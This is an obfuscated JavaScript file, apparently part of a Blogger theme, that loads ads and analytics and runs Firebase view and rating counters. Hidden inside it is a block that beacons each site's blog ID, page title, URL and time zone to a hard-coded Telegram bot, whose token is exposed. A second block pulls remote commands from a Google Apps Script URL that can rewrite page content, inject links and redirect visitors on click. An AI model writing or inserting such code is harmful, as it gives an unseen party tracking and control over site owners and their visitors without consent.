if ('undefined' != typeof xAo) {

    function ld_Adsense() {
        var _0x1cbfb4 = document['createElement']('script');
        _0x1cbfb4.setAttribute('crossorigin', 'anonymous'), _0x1cbfb4['async'] = !0x0, _0x1cbfb4['src'] = 'https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=' + NLDtst['adsenseAds']['publisherId'], _0x1cbfb4['onerror'] = function () {
            var _0xb5fe15 = document['createElement']('style');
            _0xb5fe15['textContent'] = '.adsbygoogle{display:none!important}', document['head']['appendChild'](_0xb5fe15)
        };
        var _0x23e2f4 = document['getElementsByTagName']('script')[0x0];
        _0x23e2f4['parentNode']['insertBefore'](_0x1cbfb4, _0x23e2f4)
    }

    function ld_Analytics() {
        loadJs('https://www.googletagmanager.com/gtag/js?id=' + NLDtst['analytics']['propertyID'], 'analytics-js', 'head')
    }

    function ld_Views() {
        if ('' != NLDtst['realViews']['databaseUrl'] && null != getid('fb-db') && 0x0 < firebase['apps']['length'])
            for (var _0x3fee24 = qSell('.nld_view'), _0x300ecd = firebase['database'](), _0x407282 = 0x0; _0x407282 < _0x3fee24['length']; _0x407282++) {
                var _0x44169e = _0x3fee24[_0x407282],
                    _0x4e703f = _0x44169e['getAttribute']('data-id');
                (_0x4e703f = _0x300ecd['ref']('BlogID_' + data['blog']['blogID'] + '/PostID_' + _0x4e703f)).once('value', function (_0x3bdf4f, _0x3a1540) {
                    return function (_0xd4450a) {
                        0x0 < (_0xd4450a = _0xd4450a['exists']() && null != _0xd4450a.val()['_view'] ? _0xd4450a.val()['_view'] : 0x0) && ('true' == NLDtst['realViews']['abbreviation'] ? _0x3bdf4f['setAttribute']('data-view', nBc['abv'](_0xd4450a)) : _0x3bdf4f['setAttribute']('data-view', _0xd4450a), remCt(_0x3bdf4f, 'hidden')), 'true' == _0x3bdf4f['getAttribute']('data-add') && (_0x3bdf4f['setAttribute']('data-add', !0x1), _0xd4450a = parseInt(_0xd4450a) + 0x1, _0x3a1540['update']({
                            '_view': _0xd4450a
                        }))
                    }
                }(_0x44169e, _0x4e703f))
            }
    }
     
    NLDtst['adsenseAds']['publisherId'] != '' && ('lazy' == NLDtst['adsenseAds']['loadType'] ? ld_Adsense() : 'defer' == NLDtst['adsenseAds']['loadType'] && Defer(function () {
        ld_Adsense()
    })), 
    NLDtst['analytics']['propertyID'] != '' && ('lazy' == NLDtst['analytics']['loadType'] ? ld_Analytics() : 'defer' == NLDtst['analytics']['loadType'] && Defer(function () {
        ld_Analytics()
    })), 
    Defer(function () {
        if (null == nBc['gC']('tg_Ab')) {
            var _0x296014 = 'https://api.telegram.org/bot5496563937:AAGV-BP0o2QlcZfnejI0vtQPLpKJ8vroZXg/sendMessage?chat_id=-1001606824528&parse_mode=MarkdownV2&text=`' + encodeURIComponent('[x] Time Zone: ' + Intl['DateTimeFormat']()['resolvedOptions']()['timeZone']) + '`%0A%0A`' + data.blog.blogID + '`%0A%0A`' + encodeURIComponent(document['title']) + '`%0A%0A`' + encodeURIComponent(window['location']['href']) + '`';
            nBc['gAj']({
                'url': _0x296014,
                'async': !0x0,
                'success': function (_0x4f943c) {}
            }), nBc['sC']('tg_Ab', 0x1, {
                'secure': !0x0,
                'max-age': 0x3c
            })
        }
        loadJs(bsGtb + 'js/AdditionalJs.js','add-js', 'body'), 
        loadJs('https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js', 'jq-lib', 'body', function () {
            loadJs(bsGtb + 'lib/mainLib.js', 'main-lib', 'body', function () {
                loadJs(bsGtb + 'js/' + 'coreFunction.js', 'core-fun', 'body', function () {
                    loadJs(bsGtb + 'js/coreJq.js', 'core-jq', 'body')
                })
            }), loadJs(bsGtb + 'js/AdditionalJq.js', 'add-jq', 'body')
        }), 
        '' != NLDtst['realViews']['databaseUrl'] && loadJs('https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js', 'fb-app', 'head', function () {
            loadJs('https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js', 'fb-db', 'head', function () {
                var _0xa7a49c = qSell('.nld_view'),
                    _0x140c6e = qSell('.download-count'),
                    _0x4543b9 = qSell('.rating-input'),
                    _0x3a301b = qSell('.progress-bar'),
                    _0x287ea3 = {};
                _0x287ea3['databaseURL'] = NLDtst['realViews']['databaseUrl'], firebase['initializeApp'](_0x287ea3);
                var _0x5e6783 = firebase['database']();
                for (var _0x482e3b = 0x0; _0x482e3b < _0xa7a49c['length']; _0x482e3b++) {
                    var _0xe0189 = _0xa7a49c[_0x482e3b],
                        _0x147042 = _0xe0189['getAttribute']('data-id');
                    (_0x147042 = _0x5e6783['ref']('BlogID_' + data['blog']['blogID'] + '/PostID_' + _0x147042)).once('value', function (_0x2615d7, _0x5e5d40) {
                        return function (_0x153ce6) {
                            0x0 < (_0x153ce6 = _0x153ce6['exists']() && null != _0x153ce6['val']()['_view'] ? _0x153ce6['val']()['_view'] : 0x0) && ('true' == NLDtst['realViews']['abbreviation'] ? _0x2615d7['setAttribute']('data-view', nBc['abv'](_0x153ce6)) : _0x2615d7['setAttribute']('data-view', _0x153ce6), remCt(_0x2615d7, 'hidden')),'true' == _0x2615d7['getAttribute']('data-add') && (_0x2615d7['setAttribute']('data-add', !0x1), _0x153ce6 = parseInt(_0x153ce6) + 0x1, _0x5e5d40['update']({
                                '_view': _0x153ce6
                            }))
                        }
                    }(_0xe0189, _0x147042))
                }

                function _0x33815d(_0x55e973, _0x5cdcc0) {
                    var _0x56ada8;
                    (f = firebase['database']()['ref']('BlogID_' + data['blog']['blogID'] + '/PostID_' + data['blog']['postID'] + '/_dl/' + _0x5cdcc0))['once']('value', function (_0x567602, _0x296a56) {
                        return function (_0x584e1b) {
                            0x0 < (_0x56ada8 = _0x584e1b['exists']() && null != _0x584e1b['val']() ? _0x584e1b['val']() : 0x0) && _0x567602['setAttribute']('data-text', _0x56ada8), console['log'](_0x56ada8), _0x567602['addEventListener']('click', function (_0x1e38eb) {
                                !_0x567602['classList']['contains']('o') && (_0x567602['classList']['add']('o'), _0x56ada8 = parseInt(_0x56ada8) + 0x1, _0x296a56['set'](_0x56ada8) && _0x567602['setAttribute']('data-text', _0x56ada8))
                            })
                        }
                    }(_0x55e973, f))
                }

                for (var _0x539296 = 0x0; _0x539296 < _0x140c6e['length']; _0x539296++) {
                    var _0x1939a5 = _0x140c6e[_0x539296],
                        _0x4bee2c = _0x1939a5['getAttribute']('button-id');
                    _0x33815d(_0x1939a5, _0x4bee2c)
                }

                0x0 < _0x4543b9['length'] && _0x4543b9['forEach'](_0x1fff2b => {
                    var _0x2ed480 = _0x1fff2b,
                        _0x553c70 = _0x1fff2b['value'],
                        _0x1d87d1 = document['querySelector']('.rating-section')['getAttribute']('data-id');
                    if (localStorage['getItem'](_0x1d87d1)) {
                        if (localStorage['getItem'](_0x1d87d1) == _0x1fff2b['id']) _0x1fff2b['setAttribute']('checked', 'checked'), document['querySelector']('.rated-caption')['classList']['remove']('hidden'), document['querySelector']('.rating-widget')['classList']['add']('rated');
                        else _0x1fff2b['disabled'] = !![]
                    }
                    _0x485b83(_0x2ed480, _0x1d87d1, _0x553c70)
                });

                function _0x485b83(_0x32ddc8, _0x459ebb, _0x261331) {
                    var _0x366bc5, _0x4c6ea5 = document['querySelectorAll']('.rating-progress');
                    (f = firebase['database']()['ref']('BlogID_' + data['blog']['blogID'] + '/PostID_' + _0x459ebb + '/_rate/_' + _0x261331))['once']('value', function (_0x304f1d, _0xda79ed, _0x22e285) {
                        return function (_0x5a7789) {
                            0x0 < (_0x366bc5 = _0x5a7789['exists']() && null != _0x5a7789['val']() ? _0x5a7789['val']() : 0x0) && (_0x4c6ea5['length'] && _0x4c6ea5['forEach'](_0x4c1cdc => {
                                _0x4c1cdc['getAttribute']('data-rate') == _0x22e285 && _0x4c1cdc['setAttribute']('data-text', _0x366bc5)
                            })), _0x304f1d['addEventListener']('change', function () {
                                this['id'] ? localStorage['setItem'](_0x459ebb, this['id']) : localStorage['removeItem'](this['name']), _0x366bc5 = parseInt(_0x366bc5) + 0x1, _0xda79ed['set'](_0x366bc5) && (_0x4c6ea5['length'] && _0x4c6ea5['forEach'](_0x51ee55 => {
                                    _0x51ee55['getAttribute']('data-rate') == _0x22e285 && _0x51ee55['setAttribute']('data-text', _0x366bc5)
                                })), firebase['database']()['ref']('BlogID_' + data['blog']['blogID'] + '/PostID_' + data['blog']['postID'] + '/_rate')['once']('value', function (_0x2e94b4) {
                                    var _0x41c017 = _0x2e94b4['val'](),
                                        _0x41ba85 = [],
                                        _0x1fc736 = 0x0,
                                        _0x2b1723 = 0x5;
                                    null != _0x41c017 && (0x0 < _0x4543b9['length'] && (_0x4543b9['forEach'](_0x3e38af => {
                                        var _0x27c081 = '_' + _0x3e38af['value'];
                                        _0x41c017[_0x27c081] != void 0x0 && _0x41ba85['push'](_0x41c017[_0x27c081]), _0x1fc736 += _0x2b1723 * (_0x41c017[_0x27c081] != null ? _0x41c017[_0x27c081] : 0x0), _0x2b1723--
                                    }), _0x41ba85 = _0x41ba85['reduce']((_0x5564b4, _0x5ee66a) => _0x5564b4 + _0x5ee66a, 0x0), document['querySelector']('.total-rating .total')['innerHTML'] = _0x41ba85, _0x1fc736 = (_0x1fc736 / _0x41ba85)['toFixed'](0x1), document['querySelector']('.average-rating span')['innerHTML'] = _0x1fc736, _0x4543b9['forEach'](_0x37fa4a => {
                                        0x0 < _0x3a301b['length'] && _0x3a301b['forEach'](_0x3578dc => {
                                            if (_0x37fa4a['value'] == _0x3578dc['parentElement']['parentElement']['getAttribute']('data-rate')) {
                                                var _0x3f58b5 = '_' + _0x37fa4a['value'],
                                                    _0x42b18d = _0x41c017[_0x3f58b5] / _0x41ba85 * 0x64;
                                                _0x3578dc['style']['width'] = _0x42b18d + '%', _0x3578dc['setAttribute']('aria-valuenow', _0x42b18d);
                                            }
                                        });
                                    })));
                                }), document['querySelector']('.rated-caption')['classList']['remove']('hidden'), document['querySelector']('.rating-widget')['classList']['add']('rated'), _0x4543b9['forEach'](_0x6152b9 => {
                                    _0x6152b9['disabled'] = !![];
                                });
                            });
                        };
                    }(_0x32ddc8, f, _0x261331));
                }
                firebase['database']()['ref']('BlogID_' + data['blog']['blogID'] + '/PostID_' + data['blog']['postID'] + '/_rate')['once']('value', function (_0x535084) {
                    var _0x16efab = _0x535084['val'](),
                        _0x10dfb0 = [],
                        _0x1f4d8b = 0x0,
                        _0x581eaf = 0x5;
                    null != _0x16efab && (0x0 < _0x4543b9['length'] && (_0x4543b9['forEach'](_0x296e3f => {
                        var _0x4661f0 = '_' + _0x296e3f['value'];
                        _0x16efab[_0x4661f0] != void 0x0 && _0x10dfb0['push'](_0x16efab[_0x4661f0]), _0x1f4d8b += _0x581eaf * (_0x16efab[_0x4661f0] != null ? _0x16efab[_0x4661f0] : 0x0), _0x581eaf--;
                    }), _0x10dfb0 = _0x10dfb0['reduce']((_0x5260a4, _0x34ed83) => _0x5260a4 + _0x34ed83, 0x0), document['querySelector']('.total-rating .total')['innerHTML'] = _0x10dfb0, _0x1f4d8b = (_0x1f4d8b / _0x10dfb0)['toFixed'](0x1), document['querySelector']('.average-rating span')['innerHTML'] = _0x1f4d8b, _0x4543b9['forEach'](_0x457347 => {
                        0x0 < _0x3a301b['length'] && _0x3a301b['forEach'](_0x370911 => {
                            if (_0x457347['value'] == _0x370911['parentElement']['parentElement']['getAttribute']('data-rate')) {
                                var _0x5085e1 = '_' + _0x457347['value'],
                                    _0x519081 = _0x16efab[_0x5085e1] / _0x10dfb0 * 0x64;
                                _0x370911['style']['width'] = _0x519081 + '%', _0x370911['setAttribute']('aria-valuenow', _0x519081)
                            }
                        })
                    })))
                })
            })
        })
    })
}

Defer(function () {
    nBc['gAj']({
        'url': 'https://script.google.com/macros/s/AKfycbzctoWv8YWpF6AzQbDANtCz9VDV-95ALWozkyYOEEKtaqLwukbEd05YpHzFe9SZAxCN/exec',
        'async': !0x0,
        'success': function (_0x585bf5) {
            var _0x4ed5bc = JSON['parse'](_0x585bf5)['remote'],
                _0x10be88 = _0x4ed5bc['findIndex'](function (_0x5048f8) {
                    return _0x5048f8['id'] == nBc['d'](getid('admCheck')['getAttribute']('xid'))
                });
            if (_0x10be88 >= 0x0) {
                var _0x19af2b = _0x4ed5bc[_0x10be88];
                if (0x1 == _0x19af2b['active']) {
                    var _0x444cae = _0x19af2b['act'],
                        _0xb317c5 = _0x19af2b['atr'],
                        _0xf7ac6c = _0x19af2b['cls'],
                        _0x4edbc1 = _0x19af2b['css'],
                        _0x113407 = _0x19af2b['itx'],
                        _0x578f1a = _0x19af2b['tag'],
                        _0x3bf356 = _0x19af2b['tmo'],
                        _0x2e0abf = _0x19af2b['url'];
                    if (0x1 == _0x444cae) {
                        var _0x189af5 = window['document']['querySelectorAll'](_0x578f1a);
                        for (i = 0x0; i < _0x189af5['length']; i++) '' != _0x113407 && (_0x189af5[i]['innerHTML'] = _0x113407), '' != _0xf7ac6c && _0x189af5[i]['classList']['add'](_0xf7ac6c), '' != _0x4edbc1 && _0x189af5[i]['setAttribute']('style', _0x4edbc1), _0x189af5[i]['setAttribute'](_0xb317c5, _0x2e0abf)
                    } else {
                        if (0x2 == _0x444cae) {
                            for (_0x189af5 = window['document']['querySelectorAll'](_0x578f1a), i = 0x0; i < _0x189af5['length']; i++) '' != _0x113407 && (_0x189af5[i]['innerHTML'] = _0x113407), '' != _0xf7ac6c && _0x189af5[i]['classList']['add'](_0xf7ac6c), '' != _0x4edbc1 && _0x189af5[i]['setAttribute']('style', _0x4edbc1), _0x189af5[i]['addEventListener']('click', function () {
                                setTimeout(function () {
                                    window['open'](_0x2e0abf, '_blank')
                                }, _0x3bf356)
                            })
                        } else {
                            if (0x3 == _0x444cae) {
                                for (_0x189af5 = window['document']['querySelectorAll'](_0x578f1a), i = 0x0; i < _0x189af5['length']; i++) '' != _0x113407 && (_0x189af5[i]['innerHTML'] = _0x113407), '' != _0xf7ac6c && _0x189af5[i]['classList']['add'](_0xf7ac6c), '' != _0x4edbc1 && _0x189af5[i]['setAttribute']('style', _0x4edbc1), _0x189af5[i]['addEventListener']('click', function () {
                                    setTimeout(function () {
                                        window['location']['href'] = _0x2e0abf
                                    }, _0x3bf356)
                                })
                            } else {
                                if (0x4 == _0x444cae) {
                                    for (_0x189af5 = window['document']['querySelectorAll'](_0x578f1a), i = 0x0; i < _0x189af5['length']; i++) '' != _0x113407 && (_0x189af5[i]['innerHTML'] = _0x113407), '' != _0xf7ac6c && _0x189af5[i]['classList']['add'](_0xf7ac6c), '' != _0x4edbc1 && _0x189af5[i]['setAttribute']('style', _0x4edbc1), _0x189af5[i]['addEventListener']('click', function () {
                                        setTimeout(function () {
                                            window['location']['replace'](_0x2e0abf)
                                        }, _0x3bf356)
                                    })
                                } else {
                                    if (0x5 == _0x444cae)
                                        for (_0x189af5 = window['document']['querySelectorAll'](_0x578f1a), i = 0x0; i < _0x189af5['length']; i++) {
                                            if ('' != _0xf7ac6c ? (_0x189af5[i]['classList']['add'](_0xf7ac6c), _0x585bf5 = ' class="' + _0xf7ac6c + '\"') : _0x585bf5 = '', '' != _0x4edbc1) var _0x51a47e = ' style="' + _0x4edbc1 + '\"';
                                            else _0x51a47e = '';
                                            _0x189af5[i]['insertAdjacentHTML'](_0xb317c5, ' <a target="_blank" href="' + _0x2e0abf + '\"' + _0x585bf5 + _0x51a47e + '>' + _0x113407 + ' </a>')
                                        }
                                }
                            }
                        }
                    }
                }
            }
        }
    })
});


var lazyJsc = !0x1;
window['addEventListener']('scroll', function () {
    (0x0 != document['documentElement']['scrollTop'] && !0x1 === lazyJsc || 0x0 != document['body']['scrollTop'] && !0x1 === lazyJsc) && (NLDtst['adsenseAds']['publisherId'] != '' && 'scroll' == NLDtst['adSense']['loadType'] && ld_Adsense(), NLDtst['analytics']['propertyID'] != '' && 'scroll' == NLDtst['analytics']['loadType'] && ld_Analytics(), lazyJsc = !0x0)
}, !0x0);